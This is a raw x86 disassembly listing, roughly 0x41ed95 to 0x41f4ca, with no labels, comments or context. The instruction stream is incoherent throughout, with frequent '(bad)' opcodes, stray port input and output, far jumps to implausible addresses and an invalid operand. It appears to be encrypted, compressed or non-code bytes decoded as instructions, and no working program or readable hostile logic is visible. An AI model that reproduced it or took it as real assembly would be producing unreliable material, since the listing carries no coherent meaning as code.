  41ed95:	xor    eax,0x9593a521
  41ed9a:	test   DWORD PTR [edx],ecx
  41ed9c:	out    0x7d,eax
  41ed9e:	jg     0x41ed44
  41eda0:	sahf   
  41eda1:	add    BYTE PTR [ebx+0x23],dh
  41eda4:	inc    esi
  41eda5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eda6:	test   BYTE PTR [esi+0x10],bl
  41eda9:	jno    0x41edfa
  41edab:	xor    eax,0xff8e9fa2
  41edb0:	jmp    0x4179dd62
  41edb5:	retf   
  41edb6:	int    0xca
  41edb8:	lock aam 0x31
  41edbb:	int    0x78
  41edbd:	sahf   
  41edbe:	adc    ebp,ebp
  41edc0:	es push esp
  41edc2:	sub    DWORD PTR [eax],esp
  41edc4:	cmp    esi,DWORD PTR [eax+0x67f579dc]
  41edca:	sbb    eax,0xcf98321
  41edcf:	retf   0x4564
  41edd2:	mov    eax,ds:0x85a8a277
  41edd7:	push   ebp
  41edd8:	push   ebp
  41edd9:	fidiv  DWORD PTR [edi-0x17cd0d3f]
  41eddf:	xchg   edx,eax
  41ede0:	xor    ecx,ebp
  41ede2:	clc    
  41ede3:	call   0x5400c622
  41ede8:	or     eax,0xc1313e67
  41eded:	sbb    DWORD PTR [ebx-0x40],edi
  41edf0:	mov    edi,0x765fbe12
  41edf5:	iret   
  41edf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edf7:	das    
  41edf8:	fisubr DWORD PTR [edx+0x19]
  41edfb:	push   esp
  41edfc:	ins    DWORD PTR es:[edi],dx
  41edfd:	std    
  41edfe:	pop    es
  41edff:	neg    DWORD PTR [esi]
  41ee01:	jp     0x41ee68
  41ee03:	mov    al,0x64
  41ee05:	dec    ebp
  41ee06:	aaa    
  41ee07:	repz cli 
  41ee09:	mov    ds:0xc4ec6249,eax
  41ee0e:	lods   eax,DWORD PTR ds:[esi]
  41ee0f:	(bad)  
  41ee10:	push   esi
  41ee11:	ret    
  41ee12:	add    eax,0x2c118711
  41ee17:	push   ss
  41ee18:	rol    ebp,1
  41ee1a:	fld    DWORD PTR [ebx-0x1f]
  41ee1d:	aas    
  41ee1e:	ds retf 0xea61
  41ee22:	jle    0x41eda8
  41ee24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee25:	mov    edi,0xa026f69d
  41ee2a:	scas   al,BYTE PTR es:[edi]
  41ee2b:	aad    0x42
  41ee2d:	pop    esi
  41ee2e:	fcom   DWORD PTR [ebx+edi*8-0x5b]
  41ee32:	or     al,0xc8
  41ee34:	cdq    
  41ee35:	stos   DWORD PTR es:[edi],eax
  41ee36:	sub    dh,bh
  41ee38:	pop    edi
  41ee39:	jb     0x41ee49
  41ee3b:	and    eax,0x4b11f6bb
  41ee40:	leave  
  41ee41:	fmul   st(0),st
  41ee43:	cwde   
  41ee44:	add    ebp,DWORD PTR [ebx]
  41ee46:	outs   dx,BYTE PTR ds:[esi]
  41ee47:	xchg   BYTE PTR [edi-0x6],al
  41ee4a:	ins    DWORD PTR es:[edi],dx
  41ee4b:	dec    edi
  41ee4c:	sub    eax,0xb6ff5260
  41ee51:	add    al,0x69
  41ee53:	mov    bh,0x9f
  41ee55:	fnstenv [edx]
  41ee57:	mov    al,ds:0x1345fc7a
  41ee5c:	out    dx,eax
  41ee5d:	xchg   ebp,eax
  41ee5e:	sbb    eax,0x5be96c94
  41ee63:	stc    
  41ee64:	sub    al,0xab
  41ee66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee67:	xor    eax,0x38a395ad
  41ee6c:	mov    es,edx
  41ee6e:	push   es
  41ee6f:	fcmovbe st,st(6)
  41ee71:	inc    ecx
  41ee72:	test   DWORD PTR [edx],esp
  41ee74:	(bad)  
  41ee75:	fistp  DWORD PTR [edi]
  41ee77:	sbb    edx,DWORD PTR [esi]
  41ee79:	sbb    al,0xa2
  41ee7b:	dec    edi
  41ee7c:	fcomp  QWORD PTR [ebp+0x49]
  41ee7f:	in     al,dx
  41ee80:	push   cs
  41ee81:	cmp    al,BYTE PTR [edi+0x42b5a67f]
  41ee87:	sub    al,0x99
  41ee89:	and    eax,DWORD PTR [eax+0x68]
  41ee8c:	xchg   BYTE PTR [esi+0x2d],dl
  41ee8f:	inc    esi
  41ee90:	ss pop edx
  41ee92:	dec    edi
  41ee93:	or     al,0xb8
  41ee95:	mov    edi,0x943c8b94
  41ee9a:	add    DWORD PTR [edi+0x79],0xa7ee64dc
  41eea1:	sar    BYTE PTR [ebx+eax*2-0x175e50bd],cl
  41eea8:	xchg   ebp,eax
  41eea9:	retf   
  41eeaa:	xor    DWORD PTR [eax],ebp
  41eeac:	daa    
  41eead:	mov    dh,0x25
  41eeaf:	jno    0x41eed7
  41eeb1:	add    BYTE PTR [eax],al
  41eeb3:	jle    0x41ee6f
  41eeb5:	push   ebp
  41eeb6:	shr    BYTE PTR [edi+0x18],0x58
  41eeba:	mov    eax,ds:0x6ef6300b
  41eebf:	add    bh,al
  41eec1:	and    DWORD PTR [esi-0x48],edx
  41eec4:	cs into 
  41eec6:	fimul  WORD PTR [edi]
  41eec8:	jmp    0xb6a9:0x3f2c0ab1
  41eecf:	rcl    al,1
  41eed1:	mov    dh,0xa2
  41eed3:	dec    ebx
  41eed4:	sbb    DWORD PTR [ebp-0x7],ecx
  41eed7:	pop    ecx
  41eed8:	aaa    
  41eed9:	lods   al,BYTE PTR ds:[esi]
  41eeda:	sub    ah,ah
  41eedc:	shl    DWORD PTR [edi],0x1b
  41eedf:	out    0x66,eax
  41eee1:	xor    al,0x43
  41eee3:	adc    DWORD PTR [ecx-0x27],ebp
  41eee6:	mov    al,0x39
  41eee8:	lods   eax,DWORD PTR ds:[esi]
  41eee9:	inc    eax
  41eeea:	cwde   
  41eeeb:	dec    edi
  41eeec:	inc    ebx
  41eeed:	xchg   edi,eax
  41eeee:	sbb    al,0xcd
  41eef0:	aam    0x3f
  41eef2:	or     al,0xd6
  41eef4:	or     esi,DWORD PTR [edx]
  41eef6:	ret    
  41eef7:	jbe    0x41ef08
  41eef9:	fistp  DWORD PTR [ebp+0x678dd26d]
  41eeff:	and    al,0xb
  41ef01:	aam    0x86
  41ef03:	rcr    DWORD PTR [esi],0xc7
  41ef06:	call   0x9512cadc
  41ef0b:	jmp    0xffb2:0xab343b73
  41ef12:	fstp   DWORD PTR [eax+0x31]
  41ef15:	adc    bl,BYTE PTR [edi+ebx*4-0x63]
  41ef19:	ja     0x41eedd
  41ef1b:	jo     0x41ef3a
  41ef1d:	sub    al,0x79
  41ef1f:	(bad)  
  41ef20:	lock sbb eax,0xb2bac605
  41ef26:	and    esi,DWORD PTR [ebp+eax*4-0x56]
  41ef2a:	adc    BYTE PTR [esp+ebx*8-0x6a0b6607],0x83
  41ef32:	and    dh,BYTE PTR [edx-0x53]
  41ef35:	push   edi
  41ef36:	xchg   ebp,eax
  41ef37:	ins    DWORD PTR es:[edi],dx
  41ef38:	mov    ecx,0xf835d291
  41ef3d:	cli    
  41ef3e:	mov    WORD PTR [edi],es
  41ef40:	add    BYTE PTR ds:0xdbe44f2c,0x57
  41ef47:	mov    dl,0xbd
  41ef49:	enter  0xecb8,0xea
  41ef4d:	std    
  41ef4e:	inc    ebp
  41ef4f:	ss inc ecx
  41ef51:	sub    eax,0xbfe75bca
  41ef56:	not    DWORD PTR [edx+0xa]
  41ef59:	or     edx,edi
  41ef5b:	lods   al,BYTE PTR ds:[esi]
  41ef5c:	data16 jbe 0x41ef72
  41ef5f:	mov    esi,0xb25c2bd2
  41ef64:	pop    edi
  41ef65:	mov    ebx,0xe3ff0894
  41ef6a:	outs   dx,BYTE PTR ds:[esi]
  41ef6b:	ror    BYTE PTR [esi+0x5e0a17be],1
  41ef71:	sub    eax,0xe02d6b1
  41ef76:	pop    eax
  41ef77:	inc    edi
  41ef78:	push   0x819fde7c
  41ef7d:	rcr    DWORD PTR [edx+0x31a2b4fb],cl
  41ef83:	mov    edx,0x18afad8b
  41ef88:	mov    ah,0xc3
  41ef8a:	cmp    DWORD PTR [edx],ebp
  41ef8c:	inc    ecx
  41ef8d:	or     eax,0x530b9943
  41ef92:	cmp    dl,0xe7
  41ef95:	cmp    esi,edx
  41ef97:	pop    esi
  41ef98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef99:	dec    edx
  41ef9a:	ret    0x8a40
  41ef9d:	shl    ch,1
  41ef9f:	cdq    
  41efa0:	stc    
  41efa1:	inc    esi
  41efa2:	(bad)  
  41efa3:	stos   BYTE PTR es:[edi],al
  41efa4:	dec    esp
  41efa5:	cmp    al,0x4d
  41efa7:	mov    al,0xdb
  41efa9:	add    DWORD PTR [ebp+0x78],ecx
  41efac:	dec    edi
  41efad:	test   al,0x57
  41efaf:	inc    esi
  41efb0:	loopne 0x41efa0
  41efb2:	adc    BYTE PTR [edi],bh
  41efb4:	arpl   WORD PTR [ebx+0x9],di
  41efb7:	ret    0x5cd5
  41efba:	add    ch,BYTE PTR [eax-0x46]
  41efbd:	(bad)  
  41efbe:	repnz and eax,DWORD PTR ds:0xa24170e
  41efc5:	sub    al,0x4d
  41efc7:	cmp    al,0xe3
  41efc9:	inc    ecx
  41efca:	sub    ebp,ebx
  41efcc:	mov    ecx,0x91e8a56c
  41efd1:	aas    
  41efd2:	aas    
  41efd3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41efd5:	ds dec esp
  41efd7:	cdq    
  41efd8:	pop    ds
  41efd9:	inc    ebx
  41efda:	les    ecx,FWORD PTR [esi]
  41efdc:	adc    al,0x52
  41efde:	out    dx,al
  41efdf:	loope  0x41f036
  41efe1:	(bad)  
  41efe2:	lahf   
  41efe3:	cwde   
  41efe4:	popa   
  41efe5:	mov    ah,0x20
  41efe7:	not    DWORD PTR [ecx]
  41efe9:	xchg   DWORD PTR [edx+ebx*1-0x66],eax
  41efed:	ss es mov cl,0xa4
  41eff1:	in     ax,dx
  41eff3:	dec    esp
  41eff4:	ret    
  41eff5:	xor    ecx,0x89d2cc3e
  41effb:	mov    ch,0xcc
  41effd:	and    al,0x11
  41efff:	inc    ebp
  41f000:	ss cs jno 0x41f042
  41f004:	adc    eax,0x3259fcee
  41f009:	ja     0x41efa3
  41f00b:	(bad)  
  41f00c:	and    edi,DWORD PTR [edx]
  41f00e:	mov    ds:0xa37193c,eax
  41f013:	mov    ds:0xbd2a306a,eax
  41f018:	hlt    
  41f019:	pop    esi
  41f01a:	cli    
  41f01b:	push   ss
  41f01c:	jnp    0x41eff2
  41f01e:	(bad)  
  41f01f:	push   cs
  41f020:	jno    0x41f019
  41f022:	lea    ebx,[edx]
  41f024:	push   0xffffffd1
  41f026:	adc    BYTE PTR [eax],0x6f
  41f029:	xor    ecx,DWORD PTR [ebx-0x301c54d5]
  41f02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f030:	fs retf 
  41f032:	add    BYTE PTR [esi],ch
  41f034:	jno    0x41f001
  41f036:	jae    0x41f078
  41f038:	into   
  41f039:	addr16 push esi
  41f03b:	mov    ch,0x18
  41f03d:	test   DWORD PTR [ebp+eiz*1+0xe],ecx
  41f041:	cs jnp 0x41f053
  41f044:	ror    dh,cl
  41f046:	outs   dx,BYTE PTR ds:[esi]
  41f047:	cmp    bh,BYTE PTR [edi+ebp*4+0x65]
  41f04b:	les    eax,FWORD PTR ds:0x59a5f102
  41f051:	aam    0xb2
  41f053:	and    BYTE PTR [esi+0x14],al
  41f056:	imul   ebp,DWORD PTR [ebp-0x274f6c3a],0xffffffaa
  41f05d:	mov    edi,DWORD PTR [edx+esi*8-0x157c69fa]
  41f064:	mov    BYTE PTR [edx-0x31],cl
  41f067:	arpl   dx,dx
  41f069:	jo     0x41f027
  41f06b:	lock cmp DWORD PTR [ecx+0x607a4996],edi
  41f072:	sub    DWORD PTR ds:0x9b954319,edi
  41f078:	imul   esp,DWORD PTR [ebp+0x6f3332df],0xd6f42a0e
  41f082:	inc    ebp
  41f083:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41f085:	daa    
  41f086:	xchg   edx,eax
  41f087:	inc    esi
  41f088:	call   0x3184f3b0
  41f08d:	outs   dx,BYTE PTR ds:[esi]
  41f08e:	addr16 adc eax,0x6a8d726f
  41f094:	das    
  41f095:	jno    0x41f06e
  41f097:	fs jnp 0x41f030
  41f09a:	shl    DWORD PTR [ecx-0x68],cl
  41f09d:	dec    ebx
  41f09e:	mov    bh,BYTE PTR gs:[ebp+0x23]
  41f0a2:	mov    ecx,0xf9f1b64a
  41f0a7:	inc    ecx
  41f0a8:	idiv   BYTE PTR [edi-0x52]
  41f0ab:	mov    cl,0xb1
  41f0ad:	loope  0x41f03d
  41f0af:	loope  0x41f066
  41f0b1:	lds    edi,FWORD PTR [eax+0x5d]
  41f0b4:	call   0x55f8cabb
  41f0b9:	xor    DWORD PTR [ecx-0x68595095],eax
  41f0bf:	xor    ecx,DWORD PTR [ecx-0x21f674c8]
  41f0c5:	sub    al,0x47
  41f0c7:	pop    eax
  41f0c8:	ins    DWORD PTR es:[edi],dx
  41f0c9:	clc    
  41f0ca:	in     eax,0xe6
  41f0cc:	pusha  
  41f0cd:	cdq    
  41f0ce:	gs cdq 
  41f0d0:	stos   DWORD PTR es:[edi],eax
  41f0d1:	imul   edx,ecx,0x28d4a89b
  41f0d7:	and    cl,BYTE PTR [esi-0x318219fe]
  41f0dd:	scas   eax,DWORD PTR es:[edi]
  41f0de:	push   ecx
  41f0df:	push   ebp
  41f0e0:	stos   BYTE PTR es:[edi],al
  41f0e1:	cmp    BYTE PTR [esi],bh
  41f0e3:	mov    al,ds:0xda23a3f8
  41f0e8:	inc    esp
  41f0e9:	sbb    ebx,DWORD PTR [ebx+0x21]
  41f0ec:	cmp    dh,dl
  41f0ee:	fiadd  DWORD PTR [esi]
  41f0f0:	xchg   edx,eax
  41f0f1:	xchg   esp,eax
  41f0f2:	sbb    eax,0x75eb3c37
  41f0f7:	in     eax,0xa6
  41f0f9:	imul   ebp,DWORD PTR [ebp+0x5c9b17ec],0x2be25404
  41f103:	and    DWORD PTR [esi+0x7a],0xffffffd4
  41f107:	fs jbe 0x41f0e3
  41f10a:	cmp    al,0x4b
  41f10c:	mov    DWORD PTR [edi-0x32],edi
  41f10f:	cmp    dl,BYTE PTR [eax+eax*1+0x67f29bd0]
  41f116:	shl    BYTE PTR [ecx+0xe4f7214],cl
  41f11c:	sbb    ecx,DWORD PTR [ebx-0x7d36de7f]
  41f122:	push   0xe39a0797
  41f127:	add    al,0x7a
  41f129:	xor    ch,al
  41f12b:	mov    ds:0x8ebc3f4,al
  41f130:	loop   0x41f18b
  41f132:	cmp    eax,0xa4b5b041
  41f137:	outs   dx,BYTE PTR ds:[esi]
  41f138:	jo     0x41f180
  41f13a:	cmp    esi,DWORD PTR [edi-0x3a18221f]
  41f140:	mov    al,ds:0x7c7d86f5
  41f145:	retf   
  41f146:	sub    dl,al
  41f148:	jl     0x41f1a7
  41f14a:	test   eax,0xfcfb8088
  41f14f:	adc    DWORD PTR ds:0xef689552,edx
  41f155:	aas    
  41f156:	(bad)  
  41f157:	jmp    0xca0aaca2
  41f15c:	jmp    0x3782:0x41f2cc1c
  41f163:	arpl   WORD PTR [ebx],bp
  41f165:	cmp    ah,BYTE PTR [eax]
  41f167:	out    dx,eax
  41f168:	push   es
  41f169:	sbb    dh,dh
  41f16b:	rep ins DWORD PTR es:[edi],dx
  41f16d:	in     al,dx
  41f16e:	retf   
  41f16f:	popa   
  41f170:	mov    al,ds:0xaa6ba32f
  41f175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f176:	mov    edi,0x24f2549c
  41f17b:	mov    bl,0x26
  41f17d:	sbb    al,0x18
  41f17f:	cdq    
  41f180:	mov    esi,0x6049fdff
  41f185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f186:	into   
  41f187:	iret   
  41f188:	dec    esi
  41f189:	or     DWORD PTR [ebp+0x22d078eb],ebx
  41f18f:	in     eax,0xed
  41f191:	pusha  
  41f192:	sbb    al,0x41
  41f194:	in     al,0x8a
  41f196:	shl    edx,1
  41f198:	rol    eax,0x75
  41f19b:	xchg   esp,eax
  41f19c:	inc    esi
  41f19d:	ret    
  41f19e:	iret   
  41f19f:	out    dx,al
  41f1a0:	and    cl,dl
  41f1a2:	cmp    BYTE PTR ds:0xde8c2d7,dh
  41f1a8:	popf   
  41f1a9:	mov    ah,0xd4
  41f1ab:	xchg   ecx,eax
  41f1ac:	nop
  41f1ad:	sar    DWORD PTR [edx-0x3021f89a],cl
  41f1b3:	adc    al,bl
  41f1b5:	rcr    cl,1
  41f1b7:	in     al,dx
  41f1b8:	xchg   esi,eax
  41f1b9:	cmovne esp,DWORD PTR [ecx]
  41f1bc:	sub    al,0xbc
  41f1be:	js     0x41f160
  41f1c0:	cmp    al,0xe5
  41f1c2:	sahf   
  41f1c3:	dec    edx
  41f1c4:	mov    esi,0xaab86144
  41f1c9:	or     eax,0xff8f1030
  41f1ce:	jle    0x41f227
  41f1d0:	in     eax,dx
  41f1d1:	pop    esi
  41f1d2:	or     esp,DWORD PTR [edx+edi*1]
  41f1d5:	dec    ebx
  41f1d6:	pop    esi
  41f1d7:	jecxz  0x41f211
  41f1d9:	pop    esi
  41f1da:	cmp    ecx,ecx
  41f1dc:	xor    DWORD PTR [ebp-0x7],0xffffffd4
  41f1e0:	inc    esi
  41f1e1:	push   esi
  41f1e2:	or     ebp,DWORD PTR [edx-0x379a2e22]
  41f1e8:	pop    ebx
  41f1e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1ea:	(bad)  
  41f1ec:	cmp    eax,DWORD PTR [eax]
  41f1ee:	sbb    ebp,DWORD PTR [ebp-0x617a219f]
  41f1f4:	xchg   BYTE PTR [edx-0x3ce0dfe1],cl
  41f1fa:	sub    esi,DWORD PTR [ecx+ecx*1]
  41f1fd:	push   esp
  41f1fe:	shl    edi,1
  41f200:	sbb    al,0xe5
  41f202:	mov    dh,0xd9
  41f204:	jnp    0x41f1e0
  41f206:	das    
  41f207:	aas    
  41f208:	pushf  
  41f209:	fs cdq 
  41f20b:	xor    DWORD PTR [esi-0x11],ecx
  41f20e:	(bad)  
  41f20f:	jmp    0x41f202
  41f211:	push   es
  41f212:	ficom  WORD PTR [esi]
  41f214:	xchg   ebx,eax
  41f215:	sbb    eax,DWORD PTR [ebx+0x6c]
  41f218:	inc    ecx
  41f219:	or     edx,DWORD PTR [edx]
  41f21b:	jo     0x41f1b0
  41f21d:	inc    esp
  41f21e:	das    
  41f21f:	push   ecx
  41f220:	xor    DWORD PTR [esi-0x25],eax
  41f223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f224:	sbb    DWORD PTR [edx],0xffffffc4
  41f227:	or     DWORD PTR [ebp-0x233d4ed7],0x45
  41f22e:	mov    dl,0xb9
  41f230:	in     al,dx
  41f231:	das    
  41f232:	aas    
  41f233:	in     al,dx
  41f234:	inc    edi
  41f235:	mov    ds:0xcfeeb3bf,eax
  41f23a:	dec    esi
  41f23b:	sub    edx,0xffffffbb
  41f23e:	pushf  
  41f23f:	push   esp
  41f240:	sbb    DWORD PTR [edx-0x40],ebx
  41f243:	mov    dh,BYTE PTR [edi+0x76]
  41f246:	push   esp
  41f247:	sub    eax,0x96ed222d
  41f24c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f24d:	push   ss
  41f24e:	jne    0x41f2bd
  41f250:	xchg   ebp,eax
  41f251:	adc    DWORD PTR [ebp-0x25912402],edx
  41f257:	jmp    FWORD PTR [edi]
  41f259:	mov    al,ds:0x27e4baa
  41f25e:	clc    
  41f25f:	push   esi
  41f260:	add    DWORD PTR [eax],ebp
  41f262:	jnp    0x41f21c
  41f264:	dec    ebp
  41f265:	dec    esp
  41f266:	xor    DWORD PTR [esi-0x1],0x306189ac
  41f26d:	and    eax,0xa12064d2
  41f272:	mov    dh,0x7b
  41f274:	mov    esp,0x65c4e020
  41f279:	mov    ebx,gs
  41f27b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f27c:	idiv   BYTE PTR [esi-0x61]
  41f27f:	and    ebp,DWORD PTR [edx+0x2f75d64c]
  41f285:	scas   ax,WORD PTR es:[edi]
  41f287:	pop    ds
  41f288:	ss xor cl,BYTE PTR gs:[edi-0x1]
  41f28d:	jae    0x41f292
  41f28f:	dec    edi
  41f290:	xor    ch,dh
  41f292:	ins    BYTE PTR es:[edi],dx
  41f293:	fadd   DWORD PTR [ebx+0x53a0f6b3]
  41f299:	xor    ch,BYTE PTR [edi]
  41f29b:	xor    ebp,DWORD PTR [edx+0x65]
  41f29e:	push   esi
  41f29f:	mov    ebx,0x93188325
  41f2a4:	call   0x5f88:0x97d91d41
  41f2ab:	in     eax,0x21
  41f2ad:	pop    edx
  41f2ae:	pop    ebx
  41f2af:	fcmovu st,st(0)
  41f2b1:	and    al,BYTE PTR [ebx-0x27464e31]
  41f2b7:	inc    edx
  41f2b8:	nop
  41f2b9:	stc    
  41f2ba:	pop    ebp
  41f2bb:	cmp    DWORD PTR [edx+0x4c],ebp
  41f2be:	mov    WORD PTR [ebx],fs
  41f2c0:	xor    DWORD PTR [ecx+0x7],edx
  41f2c3:	repnz mov ecx,0xa6b19bf5
  41f2c9:	mov    WORD PTR [eax],ds
  41f2cb:	and    edx,DWORD PTR [ebx]
  41f2cd:	push   0xffffffd5
  41f2cf:	mov    esi,0xb7af63e2
  41f2d4:	dec    esp
  41f2d5:	dec    esp
  41f2d6:	sub    dl,BYTE PTR [esi]
  41f2d8:	xor    eax,0xff0bff6c
  41f2dd:	int    0x33
  41f2df:	icebp  
  41f2e0:	pop    edi
  41f2e1:	daa    
  41f2e2:	dec    edx
  41f2e3:	xor    cl,0x65
  41f2e6:	repz mov edx,0xb4625933
  41f2ec:	xor    esp,DWORD PTR [eax+0x4d]
  41f2ef:	and    ah,dl
  41f2f1:	mov    ds:0xc2ed3807,eax
  41f2f6:	jle    0x41f2ef
  41f2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2f9:	fdivp  st(5),st
  41f2fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2fc:	out    dx,al
  41f2fd:	ss (bad) 
  41f2ff:	xchg   edi,eax
  41f300:	pop    eax
  41f301:	cmp    eax,0xb838d409
  41f306:	call   0x96a9:0x7e2bec3c
  41f30d:	stos   DWORD PTR es:[edi],eax
  41f30e:	push   cs
  41f30f:	lods   eax,DWORD PTR ds:[esi]
  41f310:	add    edi,DWORD PTR [ebx+0x4dc5b772]
  41f316:	(bad)  [eax]
  41f318:	loopne 0x41f2c3
  41f31a:	add    bh,ah
  41f31c:	xchg   edx,eax
  41f31d:	dec    ebx
  41f31e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f31f:	add    BYTE PTR [edx+0x68],ch
  41f322:	shr    DWORD PTR [edx+0x6e247162],cl
  41f328:	fst    DWORD PTR [eax-0x18]
  41f32b:	shl    BYTE PTR ds:0xa3d54585,1
  41f331:	cmp    ah,ah
  41f333:	adc    al,0x71
  41f335:	sbb    eax,0x2ece18de
  41f33a:	cdq    
  41f33b:	mov    dl,0x88
  41f33d:	dec    ebp
  41f33e:	lods   eax,DWORD PTR ds:[esi]
  41f33f:	sbb    al,0x78
  41f341:	mov    dh,0x9c
  41f343:	mov    BYTE PTR [esi+0x539c4945],cl
  41f349:	enter  0x8560,0xbe
  41f34d:	test   eax,0xacfc3a93
  41f352:	mov    eax,0xb5180476
  41f357:	jb     0x41f37c
  41f359:	loope  0x41f30b
  41f35b:	inc    edx
  41f35c:	jb     0x41f3ce
  41f35e:	cmp    al,0x32
  41f360:	xchg   BYTE PTR [ebx+0x53b93ac2],dl
  41f366:	push   ecx
  41f367:	push   edi
  41f368:	xor    ah,BYTE PTR [edx+0x34d3a07c]
  41f36e:	jbe    0x41f380
  41f370:	xchg   ebp,eax
  41f371:	scas   eax,DWORD PTR es:[edi]
  41f372:	dec    ebp
  41f373:	fcomp  DWORD PTR [ecx+0x4]
  41f376:	inc    edi
  41f377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f378:	mov    ecx,0xfca43ff3
  41f37d:	adc    BYTE PTR [esi-0x56717950],dl
  41f383:	inc    ecx
  41f384:	inc    esi
  41f385:	mov    ebp,0x8bcedfe2
  41f38a:	popf   
  41f38b:	sbb    eax,0xd24b10a5
  41f390:	jae    0x41f326
  41f392:	inc    edx
  41f393:	test   eax,0xda8d59d8
  41f398:	ins    DWORD PTR es:[edi],dx
  41f399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f39a:	stos   DWORD PTR es:[edi],eax
  41f39b:	pop    ds
  41f39c:	sahf   
  41f39d:	rol    DWORD PTR [esp+edi*8],1
  41f3a0:	mov    ah,0x58
  41f3a2:	test   al,0xe4
  41f3a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3a5:	ins    DWORD PTR es:[edi],dx
  41f3a6:	les    ebx,FWORD PTR [edi]
  41f3a8:	xor    ebx,DWORD PTR [eax]
  41f3aa:	rcr    BYTE PTR [ecx],0xb2
  41f3ad:	mov    al,0x6b
  41f3af:	lock enter 0x1b7f,0xc0
  41f3b4:	cmc    
  41f3b5:	mov    ebx,0x3dc53909
  41f3ba:	mov    ?,WORD PTR [esi]
  41f3bc:	sbb    BYTE PTR [esi+ebx*8-0x64569e1],cl
  41f3c3:	mov    edx,edx
  41f3c5:	sub    ebx,DWORD PTR [ebp-0x4faefc8a]
  41f3cb:	rcr    esp,1
  41f3cd:	pop    ds
  41f3ce:	or     cx,WORD PTR [ecx-0x328fd991]
  41f3d5:	jp     0x41f398
  41f3d7:	test   al,0x88
  41f3d9:	mov    ch,0x71
  41f3db:	shr    DWORD PTR [ebx+edi*2],cl
  41f3de:	sar    DWORD PTR [esi+0x6b],0x30
  41f3e2:	aaa    
  41f3e3:	inc    edx
  41f3e4:	jg     0x41f433
  41f3e6:	fidiv  DWORD PTR ds:[esi]
  41f3e9:	sub    al,BYTE PTR [ebx-0x7e]
  41f3ec:	ret    
  41f3ed:	fwait
  41f3ee:	daa    
  41f3ef:	pop    edi
  41f3f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3f1:	and    DWORD PTR [ebx+0x1214feee],eax
  41f3f7:	call   0x3d03:0x8aa12a4a
  41f3fe:	pop    esp
  41f3ff:	xor    DWORD PTR [esi],0x289b6ec5
  41f405:	pop    ss
  41f406:	pop    ds
  41f407:	mov    ebx,0xf95aaebb
  41f40c:	inc    esi
  41f40d:	ss (bad) 
  41f40f:	mov    al,ds:0x7fa73a19
  41f414:	and    al,0xa3
  41f416:	pushf  
  41f417:	rcl    DWORD PTR [edi+0x659c1559],cl
  41f41d:	and    eax,0xd1c465ce
  41f422:	push   ebp
  41f423:	fdivr  QWORD PTR [ecx-0x3f1c2ef]
  41f429:	adc    DWORD PTR [ecx+0x19],ebx
  41f42c:	push   ss
  41f42d:	and    eax,0x50f9beed
  41f432:	aam    0x18
  41f434:	or     al,0x3a
  41f436:	push   eax
  41f437:	stos   BYTE PTR es:[edi],al
  41f438:	lock dec ebx
  41f43a:	shr    BYTE PTR [eax],cl
  41f43c:	(bad)  
  41f43d:	xlat   BYTE PTR ds:[ebx]
  41f43e:	mov    ah,0x43
  41f440:	push   cs
  41f441:	inc    edx
  41f442:	or     BYTE PTR [edi+0x6964e430],ch
  41f448:	loop   0x41f44e
  41f44a:	cld    
  41f44b:	scas   eax,DWORD PTR es:[edi]
  41f44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f44d:	mov    ebp,0xb3344ce9
  41f452:	(bad)  
  41f454:	sub    eax,0x7037d84e
  41f459:	out    dx,al
  41f45a:	mov    ebp,0x4dea4e16
  41f45f:	ins    BYTE PTR es:[edi],dx
  41f460:	xor    DWORD PTR [ecx+0x6e53d022],edx
  41f466:	dec    esi
  41f467:	je     0x41f4bc
  41f469:	dec    edi
  41f46a:	pop    ss
  41f46b:	mov    cl,BYTE PTR [eax]
  41f46d:	test   eax,0x47799e26
  41f472:	ja     0x41f47e
  41f474:	cdq    
  41f475:	mov    eax,ds:0xc059727
  41f47a:	pop    edi
  41f47b:	cmp    eax,0x2178867a
  41f480:	outs   dx,BYTE PTR ds:[si]
  41f482:	sahf   
  41f483:	sbb    eax,0xedf2a160
  41f488:	and    DWORD PTR [eax+ebx*8],ebx
  41f48b:	cmp    DWORD PTR ds:[ebp-0x4a],0x2a
  41f490:	enter  0x58ad,0x4
  41f494:	in     al,dx
  41f495:	rcl    BYTE PTR [edx-0x3e],cl
  41f498:	cmp    eax,0xb02653a7
  41f49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f49e:	jno    0x41f457
  41f4a0:	stos   DWORD PTR es:[edi],eax
  41f4a1:	sub    DWORD PTR [ebp+0x23],0x8f70c853
  41f4a8:	pop    ds
  41f4a9:	aam    0xac
  41f4ab:	mov    es,WORD PTR [edx]
  41f4ad:	data16 int3 
  41f4af:	adc    BYTE PTR [esi+0x675a1e1f],cl
  41f4b5:	stos   BYTE PTR es:[edi],al
  41f4b6:	outs   dx,DWORD PTR ds:[esi]
  41f4b7:	add    ebx,DWORD PTR [ecx-0x35]
  41f4ba:	jmp    DWORD PTR [esi-0x39849446]
  41f4c0:	add    al,0xe8
  41f4c2:	fadd   DWORD PTR [ecx]
  41f4c4:	arpl   WORD PTR [ebp+ebx*2+0x63],ax
  41f4c8:	in     al,0xe9
  41f4ca:	or     edi,DWORD PTR [eax-0x5af638]
